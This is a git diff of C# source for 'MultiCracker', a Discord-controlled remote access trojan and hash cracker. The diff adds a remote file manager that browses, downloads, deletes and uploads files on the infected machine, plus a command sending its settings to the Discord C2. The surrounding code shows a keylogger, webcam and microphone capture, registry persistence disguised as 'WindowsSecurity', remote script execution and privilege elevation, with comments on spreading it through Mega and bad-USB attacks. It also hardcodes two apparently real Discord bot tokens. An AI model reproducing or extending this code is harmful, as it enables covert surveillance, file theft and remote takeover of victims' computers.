@@ -34,6 +34,10 @@ using System.Linq;
 using NAudio.CoreAudioApi;
 using NAudio.Wave;
 using Discord.Audio;
+using Microsoft.VisualBasic.ApplicationServices;
+using NAudio.Gui;
+using static System.Net.WebRequestMethods;
+using System.Security.Policy;
 
 
 namespace MultiCracker
@@ -76,7 +80,7 @@ namespace MultiCracker
         // DONE: File management for RAT.
         // DONE: Keylogger for RAT.
         // Better filter for RAT keylogger, its good but could be better.
-        // Keylogger not working when compiling to one file.
+        // Keylogger not working when compiling to one System.IO.File.
         // DONE: Make screenshot working for entire screen when only client is only using one screen.
         // DONE: Not being able to restart RAT if its channel is deleted.
         // DONE: Add command for sending all variables to the C2.
@@ -102,8 +106,10 @@ namespace MultiCracker
         string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
 
         // Communication
-        string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
-        private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
+        //string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
+        string BOT_TOKEN = "MTE4NDUwMDgwMzE2ODM3ODkwMA.G5OUXt.zGqLK-1Sm_fDJUyQhhxLK6HEYFr3u4kUecOMCQ";
+        //private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
+        private static string ratPrimaryToken = "MTE5Njg3NjIzMjk4NjQ2ODQ5Mw.GMcowN.BKhzAJuo4TYQUkPwRmHXCxHi33_W3ag63DeI4Y";
         private static string ratAlternativeToken = "<BOT TOKEN (IS NOT USED IN BELOW 2.2.0)>"; // Secondary token for the RAT. (Not used in 2.2.0)
         
         string registryName = "WindowsSecurity"; // Name of the registry key. (Special and normal)
@@ -117,12 +123,21 @@ namespace MultiCracker
         // Now you are done with the settings.
         //
         // 1. Compile and run the program, by pressing CTRL + B.
-        // 2. Navigate to the bin folder where you will see the MultiCracker.exe file. (At Your-Directory\Multi-Cracker\MultiCracker\bin\Debug\net6.0-windows\MultiCracker.exe)
+        // 2. Navigate to the bin folder where you will see the MultiCracker.exe System.IO.File. (At Your-Directory\Multi-Cracker\MultiCracker\bin\Debug\net6.0-windows\MultiCracker.exe)
         // 3. Test the program by running it. (Double click the .exe file)
         // 4. If you want to hide the window, go back to the code and change the DebugMode variable to false. And go to step 1.
         // 5. If everything works as expected, you can now start to distribute the program to your other computers. (I would recommend to upload the program and its .dll files to a file hosting service like Mega.)
         // And then when you want to use the program, you can just download it and run it. (such as with a bad USB attack).
         // ----------------------------------------
+
+        // ----------------------------------------
+        // ChangeLog for current version:
+        // ----------------------------------------
+        // - File management for RAT.
+        // - Better functionality for RAT despawn/spawning.
+        // - Added a way to send all variables to the C2.
+        // ----------------------------------------
+
 
         // Discord
         bool FoundCorrectPass = false;
@@ -138,7 +153,7 @@ namespace MultiCracker
         int currentWarningLevelRAT = 0;
 
         // Version
-        string currentVersion = "2.3.0";
+        string currentVersion = "2.4.0";
 
         // Force start/end
         int forceEnd = int.MaxValue; // As high as possible (default)
@@ -169,6 +184,11 @@ namespace MultiCracker
 
         // RAT
         bool RATRunning = false;
+        bool manuallyKilled = false;
+
+        // File management
+        bool fileManagerActive = false;
+        string currentPath = "C:\\";
 
         // Keylogger
         bool KeyloggerRunning = false;
@@ -393,7 +413,7 @@ namespace MultiCracker
                     messagesOther.Add("**!execute <vbs/powershell> <url-to-script-to-execute>** - Could be used to update the bot to your newer version of multi-cracker, or just execute vbs/powershell scripts.\r\n");
                     messagesOther.Add("**!cmd <command>** - Execute commands with CMD on bot's computer.\r\n");
                     messagesDebug.Add("\r\n**-------------- DEBUG --------------**\r\n");
-                    messagesDebug.Add("**!log** - Sends entire log as .txt file.\r\n");
+                    messagesDebug.Add("**!log** - Sends entire log as .txt System.IO.File.\r\n");
                     messagesDebug.Add("**!check <hash>** - Checks \"forces\" channel for missing passwords.\r\n");
                     messagesDebug.Add("**!auto** - Will trigger the auto crack feature.\r\n");
                     messagesDebug.Add("**!createAuto <Number of Splits>** - Creates a new auto-target for bots to target with current settings.\r\n");
@@ -948,13 +968,13 @@ namespace MultiCracker
                     {
                         string log = txtOutput.Text;
                         string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "log.txt");
-                        File.WriteAllText(fullPath, log);
+                        System.IO.File.WriteAllText(fullPath, log);
                         // Send the file (NOT AS NORMAL TEXT)
                         await message.Channel.SendFileAsync(fullPath);
 
                         Log(new LogMessage(LogSeverity.Info, "Message", $"Sent log file to C2."));
                         // Remove log
-                        File.Delete(fullPath);
+                        System.IO.File.Delete(fullPath);
                     }
                     catch (Exception ex)
                     {
@@ -962,6 +982,85 @@ namespace MultiCracker
                         await message.Channel.SendMessageAsync($"Error sending log file: {ex.Message}");
                         // Log
                         Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending log file: {ex.Message}"));
+                    }
+                }
+                else if (trimmedContent == "!variables")
+                {
+                    string variables = "**All Variables:**\r\n" +
+                        $"bool **SpecialPersistent = {SpecialPersistent}**\r\n" +
+                        $"bool **NormalPersistent = {NormalPersistent}**\r\n" +
+                        $"bool **UAConStart = {UAConStart}**\r\n" +
+                        $"bool **AutoCrack = {AutoCrack}**\r\n" +
+                        $"bool **AutoRAT = {AutoRAT}**\r\n" +
+                        $"bool **DebugMode = {DebugMode}**\r\n" +
+                        $"string **BOT_CATEGORY = {BOT_CATEGORY}**\r\n" +
+                        $"string **RAT_CATEGORY = {RAT_CATEGORY}**\r\n" +
+                        $"string **BOT_TOKEN = {BOT_TOKEN}**\r\n" +
+                        $"string **ratPrimaryToken = {ratPrimaryToken}**\r\n" +
+                        $"string **ratAlternativeToken = {ratAlternativeToken}**\r\n" +
+                        $"string **registryName = {registryName}**\r\n" +
+                        $"string **dropPath = {dropPath}**\r\n" +
+                        $"string **fileName = {fileName}**\r\n" +
+                        $"string **fileNameSpecial = {fileNameSpecial}**\r\n" +
+                        $"\r\n**OTHER**\r\n" +
+                        $"bool **FoundCorrectPass = {FoundCorrectPass}**\r\n" +
+                        $"string **elsesPassword = {elsesPassword}**\r\n" +
+                        $"string **elsesHash = {elsesHash}**\r\n" +
+                        $"bool EmergencySTOP = {EmergencySTOP}\r\n" +
+                        $"string **hash = {hash}**\r\n" +
+                        $"int currentWarningLevel = {currentWarningLevel}\r\n" +
+                        $"int currentWarningLevelRAT = {currentWarningLevelRAT}\r\n" +
+                        $"string **currentVersion = {currentVersion}**\r\n" +
+                        $"int **forceEnd = {forceEnd}**\r\n" +
+                        $"int **forceStart = {forceStart}**\r\n" +
+                        $"string forcesSS = {forcesSS}**\r\n" +
+                        $"\r\n**HASH SETTINGS**\r\n" +
+                        $"string **Algorithm = {Algorithm}**\r\n" +
+                        $"bool **UseNumbers = {UseNumbers}**\r\n" +
+                        $"bool **UseLetters = {UseLetters}**\r\n" +
+                        $"bool **UseSymbols = {UseSymbols}**\r\n" +
+                        $"bool **UseCapitals = {UseCapitals}**\r\n" +
+                        $"int **MaxLength = {MinLength}**\r\n" +
+                        $"int **MinLength = {MaxLength}**\r\n" +
+                        $"\r\n**AUTO SETTINGS**\r\n" +
+                        $"string **AutoHash = {AutoHash}**\r\n" +
+                        $"string **AutoAlgorithm = {AutoAlgorithm}**\r\n" +
+                        $"bool **AutoUseNumbers = {AutoUseNumbers}**\r\n" +
+                        $"bool **AutoUseLetters = {AutoUseLetters}**\r\n" +
+                        $"bool **AutoUseSymbols = {AutoUseSymbols}**\r\n" +
+                        $"bool **AutoUseCapitals = {AutoUseCapitals}**\r\n" +
+                        $"int **AutoMaxLength = {AutoMaxLength}**\r\n" +
+                        $"int **AutoMinLength = {AutoMinLength}**\r\n" +
+                        $"string **AutoForcesSS = {AutoForcesSS}**\r\n" +
+                        $"\r\n**OTHER**\r\n" +
+                        $"bool **RATRunning = {RATRunning}**\r\n" +
+                        $"bool **manuallyKilled = {manuallyKilled}**\r\n" +
+                        $"bool **fileManagerActive = {fileManagerActive}**\r\n" +
+                        $"string **currentPath = {currentPath}**\r\n" +
+                        $"bool **KeyloggerRunning = {KeyloggerRunning}**\r\n" +
+                        $"string **KeyloggerLog = {KeyloggerLog}**\r\n" +
+                        $"bool **isMicrophoneRecording = {isMicrophoneRecording}**\r\n" +
+                        $"int **counter = {counter}**\r\n" +
+                        $"BigInteger **AccualCount = {AccualCount}**";
+
+                    try
+                    {
+                        await message.Channel.SendMessageAsync(variables);
+
+                    }
+                    catch (Exception ex)
+                    {
+                        // Send it as file instead
+                        string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "variables.txt");
+                        System.IO.File.WriteAllText(fullPath, variables);
+                        
+                        // Send the file (NOT AS NORMAL TEXT)
+                        await message.Channel.SendFileAsync(fullPath);
+                        Log(new LogMessage(LogSeverity.Info, "Message", $"Sent variables file to C2."));
+                        
+                        // Remove log
+                        System.IO.File.Delete(fullPath);
+
                     }
                 }
                 else if (trimmedContent.StartsWith("!check"))
@@ -1226,6 +1325,9 @@ namespace MultiCracker
 
                             // Set RATRunning to false (That automatically restarts the RAT)
                             RATRunning = false;
+
+                            // Set manuallyKilled
+                            manuallyKilled = false;
                         }
                     }
                     else
@@ -1233,6 +1335,9 @@ namespace MultiCracker
                         // Send discord message
                         await message.Channel.SendMessageAsync($"Starting RAT...");
                         Log(new LogMessage(LogSeverity.Info, "RAT", $"Starting RAT..."));
+
+                        // Set manuallyKilled to false
+                        manuallyKilled = false;
 
                         // Start RAT
                         Task.Run(() => RAT());
@@ -1595,6 +1700,11 @@ namespace MultiCracker
         {
             if (!RATRunning)
             {
+                if (manuallyKilled)
+                {
+                    return;
+                }
+
                 // Log
                 LogRAT(new LogMessage(LogSeverity.Error, "RAT", "The RAT channel is not found... Restarting RAT"));
                 // Stop the RAT client
@@ -1812,6 +1922,308 @@ namespace MultiCracker
             {
                 bool isWebcamCapturing = false;
 
+                if (fileManagerActive)
+                {
+                    // BASIC
+                    if (trimmedContent == "!exit")
+                    {
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"Exiting file manager...");
+                        LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Exiting file manager..."));
+                        fileManagerActive = false;
+                    }
+                    else if (trimmedContent == "!help")
+                    {
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"File manager commands:\r\n" +
+                            $"** ----------- BASIC ----------- **\r\n" +
+                            $"**!exit** - Exit file manager.\r\n" +
+                            $"**!help** - Show this help message.\r\n" +
+                            $"\r\n** ----------- LURKING ----------- **\r\n" +
+                            $"**!ls/!dir <optional: directory>** - List files in the current directory.\r\n" +
+                            $"**!cd <directory>** - Change directory.\r\n" +
+                            $"**!download <file>** - Download a System.IO.File.\r\n" +
+                            $"\r\n** ----------- MODIFYING ----------- **\r\n" +
+                            $"**!mkdir <directory>** - Create a directory.\r\n" +
+                            $"**!rmdir <directory>** - Remove a directory.\r\n" +
+                            $"**!del <file>** - Delete a System.IO.File.\r\n" +
+                            $"**!upload <filename.extension>** - Upload a file (using attachments).\r\n");
+                    }
+                    // LURKING
+                    else if (trimmedContent.StartsWith("!ls") || trimmedContent.StartsWith("!dir"))
+                    {
+                        string argument = "";
+                        if (trimmedContent.StartsWith("!ls"))
+                        {
+                            // Get the aruments (!ls <directory>)
+                            argument = trimmedContent.Substring(3);
+                        }
+                        else if (trimmedContent.StartsWith("!dir"))
+                        {
+                            // Get the aruments (!dir <directory>)
+                            argument = trimmedContent.Substring(4);
+                        }
+
+                        // Check if the argument is null or empty
+                        if (string.IsNullOrEmpty(argument))
+                        {
+                            // Get all directories and files in the currentPath
+                            string[] allDirectories = Directory.GetDirectories(currentPath);
+                            string[] allFiles = Directory.GetFiles(currentPath);
+                            
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"**Directories:**\r\n" + string.Join("\r\n", allDirectories) + "\r\n**Files:**\r\n" + string.Join("\r\n", allFiles));
+                        }
+                        else
+                        {
+                            // Make a array of all directories in "currentPath" that starts with "argument"
+                            string[] directories = Directory.GetDirectories(currentPath, argument + "*", SearchOption.TopDirectoryOnly);
+                            
+                            // If length of directories is 0
+                            if (directories.Length == 0)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"No directory found.");
+                                LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No directory found."));
+                            }
+                            else if (directories.Length == 1)
+                            {
+                                // Get all directories and files in the directory
+                                string[] allDirectories = Directory.GetDirectories(directories[0]);
+                                string[] allFiles = Directory.GetFiles(directories[0]);
+
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"**Directories:**\r\n" + string.Join("\r\n", allDirectories) + "\r\n**Files:**\r\n" + string.Join("\r\n", allFiles));
+                            }
+                            else if (directories.Length > 1)
+                            {
+                                // Send discord message with all directories found
+                                await message.Channel.SendMessageAsync($"**Multible directories found:**\r\n" + string.Join("\r\n", directories));
+                                LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"**Multible directories found:**\r\n" + string.Join("\r\n", directories)));
+                            }
+
+                        }
+                    }
+                    else if (trimmedContent.StartsWith("!cd"))
+                    {
+                        // Get the aruments (!cd <directory>)
+                        string argument = trimmedContent.Substring(3);
+
+                        if (string.IsNullOrEmpty(argument))
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"No directory specified.");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No directory specified."));
+                            return;
+                        }
+                        else if (!argument.Contains(".."))
+                        {
+                            // Remove spaces from argument
+                            argument = argument.Replace(" ", "");
+
+                            // Get all directories in "currentPath" that starts with "argument"
+                            string[] directories = Directory.GetDirectories(currentPath, argument + "*", SearchOption.TopDirectoryOnly);
+
+                            // If length of directories is 0
+                            if (directories.Length == 0)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"No directory found. (Current directory: {currentPath}, looking for {argument})");
+                                LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No directory found."));
+                            }
+                            else if (directories.Length == 1)
+                            {
+                                // Set the currentPath to the directory
+                                currentPath = directories[0];
+
+                                // Remove spaces from the path
+                                currentPath = currentPath.Replace("\\ ", "\\");
+
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Changed directory to: {currentPath}");
+                                LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Changed directory to: {currentPath}"));
+                            }
+                            else if (directories.Length > 1)
+                            {
+                                // Send discord message with all directories found
+                                await message.Channel.SendMessageAsync($"**Multible directories found:**\r\n" + string.Join("\r\n", directories));
+                                LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"**Multible directories found:**\r\n" + string.Join("\r\n", directories)));
+                            }
+                        }
+                        else
+                        {
+                            // Find parent directory to currentPath
+                            string parentDirectory = Directory.GetParent(currentPath).FullName;
+
+                            // Set the currentPath to the parent directory
+                            currentPath = parentDirectory;
+
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Changed directory to: {currentPath}");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Changed directory to: {currentPath}"));
+                        }
+
+                        
+
+                    }
+                    else if (trimmedContent.StartsWith("!download"))
+                    {
+                        // Get the aruments (!download <file>)
+                        string argument = trimmedContent.Substring(9);
+
+                        // Remove spaces from the argument
+                        argument = argument.Replace(" ", "");
+
+                        // Get all files in "currentPath" that starts with "argument"
+                        string[] files = Directory.GetFiles(currentPath, argument + "*", SearchOption.TopDirectoryOnly);
+
+                        // If length of files is 0
+                        if (files.Length == 0)
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"No file found.");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No file found."));
+                        }
+                        else if (files.Length == 1)
+                        {
+                            // Send discord message with the file
+                            await message.Channel.SendFileAsync(files[0]);
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Sent file: {files[0]}"));
+                        }
+                        else if (files.Length > 1)
+                        {
+                            // Send discord message with all files found
+                            await message.Channel.SendMessageAsync($"**Multible files found:**\r\n" + string.Join("\r\n", files));
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"**Multible files found:**\r\n" + string.Join("\r\n", files)));
+                        }
+                    }
+                    // MODIFYING
+                    else if (trimmedContent.StartsWith("!mkdir"))
+                    {
+                        // Get the aruments (!mkdir <directory>)
+                        string argument = trimmedContent.Substring(6);
+
+                        // Remove spaces from the argument
+                        argument = argument.Replace(" ", "");
+
+                        if (string.IsNullOrEmpty(argument))
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"No directory specified.");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No directory specified."));
+                            return;
+                        }
+                        else
+                        {
+                            // Create the directory
+                            Directory.CreateDirectory(Path.Combine(currentPath, argument));
+
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Created directory: {Path.Combine(currentPath, argument)}");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Created directory: {Path.Combine(currentPath, argument)}"));
+                        }
+                    }
+                    else if (trimmedContent.StartsWith("!rmdir"))
+                    {
+                        // Get the aruments (!rmdir <directory>)
+                        string argument = trimmedContent.Substring(6);
+
+                        // Remove spaces from the argument
+                        argument = argument.Replace(" ", "");
+
+                        if (string.IsNullOrEmpty(argument))
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"No directory specified.");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No directory specified."));
+                            return;
+                        }
+                        else
+                        {
+                            // Remove the directory
+                            Directory.Delete(Path.Combine(currentPath, argument), true);
+
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Removed directory: {Path.Combine(currentPath, argument)}");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Removed directory: {Path.Combine(currentPath, argument)}"));
+                        }
+                    }
+                    else if (trimmedContent.StartsWith("!del"))
+                    {
+                        // Get the aruments (!del <file>)
+                        string argument = trimmedContent.Substring(4);
+
+                        // Remove spaces from the argument
+                        argument = argument.Replace(" ", "");
+
+                        // Get all files in "currentPath" that starts with "argument"
+                        string[] files = Directory.GetFiles(currentPath, argument + "*", SearchOption.TopDirectoryOnly);
+
+                        // If length of files is 0
+                        if (files.Length == 0)
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"No file found.");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No file found."));
+                        }
+                        else if (files.Length == 1)
+                        {
+                            // Remove the file
+                            System.IO.File.Delete(files[0]);
+
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Removed file: {files[0]}");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Removed file: {files[0]}"));
+                        }
+                        else if (files.Length > 1)
+                        {
+                            // Send discord message with all files found
+                            await message.Channel.SendMessageAsync($"**Multible files found:**\r\n" + string.Join("\r\n", files));
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"**Multible files found:**\r\n" + string.Join("\r\n", files)));
+                        }
+                    }
+                    else if (trimmedContent.StartsWith("!upload"))
+                    {
+                        // Get the aruments (!upload <file>)
+                        string argument = trimmedContent.Substring(7);
+
+                        // Remove spaces from the argument
+                        argument = argument.Replace(" ", "");
+
+                        // Check if the message has attachments
+                        if (message.Attachments.Count == 0)
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"No file attached.");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"No file attached."));
+                            return;
+                        }
+                        else
+                        {
+                            // Get the first attachment
+                            var attachment = message.Attachments.FirstOrDefault();
+
+                            // Download the attachment
+                            using (var client = new WebClient())
+                            {
+                                // Download the file
+                                client.DownloadFile(attachment.Url, Path.Combine(currentPath, argument));
+                            }
+
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Uploaded file: {Path.Combine(currentPath, argument)}");
+                            LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Uploaded file: {Path.Combine(currentPath, argument)}"));
+                        }
+                    }
+                    else if (trimmedContent.StartsWith("!"))
+                    {
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"Unknown command. Type **!help** for help.");
+                        LogRAT(new LogMessage(LogSeverity.Info, "File Manager", $"Unknown command."));
+                    }
+                    return;
+                }
+
                 LogRAT(new LogMessage(LogSeverity.Info, "Message", $"Received message: {trimmedContent}"));
                 // BASIC
                 if (trimmedContent == "!help")
@@ -1838,8 +2250,7 @@ namespace MultiCracker
                     Help_Message += $"**!elevate** - Elevates the bot to admin.\r\n";
                     // FILE SYSTEM
                     Help_Message += "\r\n**------------------- FILE SYSTEM -------------------**\r\n";
-                    Help_Message += $"**!upload <DISCORD ATTACHMENT> <Folder\\of\\uploaded\\file>** - Uploads a file to the bot.\r\n";
-                    Help_Message += $"**!download <filename>** - Downloads a file from the bot.\r\n";
+                    Help_Message += $"**!filemanager** - Activate file manager, OBS: New inputs will not be seen until you exit.\r\n";
                     // RECOVERY
                     Help_Message += "\r\n**------------------- RECOVERY -------------------**\r\n";
                     Help_Message += "** WILL ADD COMMANDS HERE LATER **\r\n";
@@ -1857,6 +2268,10 @@ namespace MultiCracker
                     await channel.DeleteAsync();
                     // Stop the RAT client
                     await _ratClient.StopAsync();
+
+                    // Set manuallyKilled to true
+                    manuallyKilled = true;
+
                     // Stop the bot (Variable)
                     RATRunning = false;
                 }
@@ -1980,11 +2395,11 @@ namespace MultiCracker
 
                             // Remove old webcam image
                             string webcamImagePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "webcam_image.png");
-                            if (File.Exists(webcamImagePath))
+                            if (System.IO.File.Exists(webcamImagePath))
                             {
                                 try
                                 {
-                                    File.Delete(webcamImagePath);
+                                    System.IO.File.Delete(webcamImagePath);
                                     // Log
                                     LogRAT(new LogMessage(LogSeverity.Info, "Webcam", $"Deleted old webcam image."));
                                 }
@@ -2095,7 +2510,7 @@ namespace MultiCracker
                             // Delete the file
                             try
                             {
-                                File.Delete(webcamImagePath);
+                                System.IO.File.Delete(webcamImagePath);
                                 Log(new LogMessage(LogSeverity.Info, "Webcam", $"Deleted webcam image."));
                             }
                             catch (Exception ex)
@@ -2304,64 +2719,13 @@ namespace MultiCracker
                     await Task.Run(() => ElevateToAdmin());
                 }
                 // FILE SYSTEM
-                else if (trimmedContent.StartsWith("!upload"))
+                else if (trimmedContent == "!filemanager")
                 {
-                    // Get argument (path)
-                    string argument = trimmedContent.Substring(8);
-
-                    // Get the filename of attached file in "message"
-                    string file = message.Attachments.FirstOrDefault()?.Filename;
-                    
                     // Send discord message
-                    await message.Channel.SendMessageAsync($"Downloading file: {file}");
+                    await message.Channel.SendMessageAsync($"Starting file manager... send **!exit** to exit, or **!help** to get commands");
 
-                    // Log
-                    LogRAT(new LogMessage(LogSeverity.Info, "Upload", $"Downloading file: {file}"));
-
-                    try
-                    {
-                        // Get url to file
-                        string url = message.Attachments.FirstOrDefault()?.Url;
-
-                        // Log url
-                        LogRAT(new LogMessage(LogSeverity.Info, "Upload", $"URL: {url}"));
-
-                        // Download file
-                        string downloadPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file);
-                        if (argument != "" || argument != null || argument != " ")
-                            downloadPath = Path.Combine(argument, file);
-                        // Log
-                        LogRAT(new LogMessage(LogSeverity.Info, "Upload", $"Download path: {downloadPath}"));
-                        using (var client = new WebClient())
-                        {
-                            client.DownloadFile(url, downloadPath);
-                        }
-
-                        // Send discord message
-                        await message.Channel.SendMessageAsync($"File downloaded to: {downloadPath}");
-                    
-                        // Log
-                        Log(new LogMessage(LogSeverity.Info, "Upload", $"File downloaded to: {downloadPath}"));
-                    }
-                    catch (Exception ex)
-                    {
-                        // Send discord message
-                        await message.Channel.SendMessageAsync($"Error downloading file: {ex.Message}");
-                        // Log
-                        Log(new LogMessage(LogSeverity.Error, "Upload", $"Error downloading file: {ex.Message}"));
-                    }
-                    
-                }
-                else if (trimmedContent.StartsWith("!download"))
-                {
-                    // Get the file
-                    string file = trimmedContent.Substring(10);
-
-                    // Send discord message
-                    await message.Channel.SendMessageAsync($"Downloading file: {file}");
-
-                    // Upload a file from local pc to discord
-                    await Task.Run(() => DownloadFile(file));
+                    // Start file manager
+                    fileManagerActive = true;
                 }
                 // RECOVERY
                 
@@ -2372,13 +2736,13 @@ namespace MultiCracker
                     {
                         string log = txtOutput.Text;
                         string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "log.txt");
-                        File.WriteAllText(fullPath, log);
+                        System.IO.File.WriteAllText(fullPath, log);
                         // Send the file (NOT AS NORMAL TEXT)
                         await message.Channel.SendFileAsync(fullPath);
 
                         Log(new LogMessage(LogSeverity.Info, "Message", $"Sent log file to C2."));
                         // Remove log
-                        File.Delete(fullPath);
+                        System.IO.File.Delete(fullPath);
                     }
                     catch (Exception ex)
                     {
@@ -2490,7 +2854,7 @@ namespace MultiCracker
                 }
 
                 // Delete the temporary file
-                File.Delete(tempFilePath);
+                System.IO.File.Delete(tempFilePath);
             };
 
             // Start recording
@@ -2590,11 +2954,11 @@ namespace MultiCracker
             formattedLog = formattedLog.Replace("Oemplus", "+");
             formattedLog = formattedLog.Replace("OemMinus", "-");
             formattedLog = formattedLog.Replace("OemPipe", "|");
-            formattedLog = formattedLog.Replace("Oemtilde", "ö");
+            formattedLog = formattedLog.Replace("Oemtilde", "ï¿½");
             formattedLog = formattedLog.Replace("OemBackslash", "\\");
             formattedLog = formattedLog.Replace("Oem8", "*");
-            formattedLog = formattedLog.Replace("Oem7", "ä");
-            formattedLog = formattedLog.Replace("Oem6", "å");
+            formattedLog = formattedLog.Replace("Oem7", "ï¿½");
+            formattedLog = formattedLog.Replace("Oem6", "ï¿½");
             formattedLog = formattedLog.Replace("Oem5", "%");
             formattedLog = formattedLog.Replace("Oem3", "#");
             formattedLog = formattedLog.Replace("Oem1", ":");
@@ -2815,7 +3179,7 @@ namespace MultiCracker
             
                     // Download the content to a .vbs file
                     string vbsPath = Path.Combine(dropPath, "script.vbs");
-                    File.WriteAllText(vbsPath, content);
+                    System.IO.File.WriteAllText(vbsPath, content);
 
                     // Execute (cscript /E:vbscript \"{vbsPath}\") with cmd
                     ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", $"/C cscript /E:vbscript \"{vbsPath}\"");
@@ -2995,7 +3359,7 @@ namespace MultiCracker
             }
 
             // Check if the executable is in droppoint
-            if (File.Exists(fullExePath))
+            if (System.IO.File.Exists(fullExePath))
             {
                 exePersistenceInstalled = true;
             }
@@ -3070,7 +3434,7 @@ namespace MultiCracker
                             string fileName = Path.GetFileName(file);
                             string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
                             string newFilePath = Path.Combine(dropPath, fileName);
-                            File.Move(fullFilePath, newFilePath);
+                            System.IO.File.Move(fullFilePath, newFilePath);
                             // Log
                             Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPath}"));
                         }
@@ -3144,7 +3508,7 @@ namespace MultiCracker
             }
 
             // Check if the executable is in droppoint
-            if (File.Exists(fullExePath))
+            if (System.IO.File.Exists(fullExePath))
             {
                 exePersistenceInstalled = true;
             }
@@ -3213,7 +3577,7 @@ namespace MultiCracker
                         {
                             string fileName = Path.GetFileName(file);
                             string fullFilePath = Path.Combine(dropPath, fileName);
-                            File.Delete(fullFilePath);
+                            System.IO.File.Delete(fullFilePath);
                             // Log
                             Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPath}"));
                         }
@@ -3332,7 +3696,7 @@ namespace MultiCracker
                 }
 
                 // Check if the executable is in droppoint
-                if (File.Exists(newExePath))
+                if (System.IO.File.Exists(newExePath))
                 {
                     // Log
                     Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is already installed."));
@@ -3343,7 +3707,7 @@ namespace MultiCracker
                     // Copy the executable to drop point
                     try
                     {
-                        File.Copy(exePath, newExePath);
+                        System.IO.File.Copy(exePath, newExePath);
                         // Log
                         Log(new LogMessage(LogSeverity.Info, "Persistence", $"Copied {exePath} to {newExePath}"));
                     }
@@ -3392,7 +3756,7 @@ namespace MultiCracker
                 }
 
                 // Check if both are installed
-                if (regeditPersistenceInstalled && File.Exists(newExePath))
+                if (regeditPersistenceInstalled && System.IO.File.Exists(newExePath))
                 {
                     // Log
                     Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
@@ -3446,12 +3810,12 @@ namespace MultiCracker
                 string targetDirectory = @"C:\windows\security\database";
 
                 // Check if the executable is in droppoint
-                if (File.Exists(newExePath))
+                if (System.IO.File.Exists(newExePath))
                 {
                     // Delete the executable
                     try
                     {
-                        File.Delete(newExePath);
+                        System.IO.File.Delete(newExePath);
                         // Log
                         Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {newExePath}"));
                     }
@@ -3508,7 +3872,7 @@ namespace MultiCracker
                 }
 
                 // Check if both are installed
-                if (regeditPersistenceInstalled || File.Exists(newExePath))
+                if (regeditPersistenceInstalled || System.IO.File.Exists(newExePath))
                 {
                     // Log
                     Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is installed."));
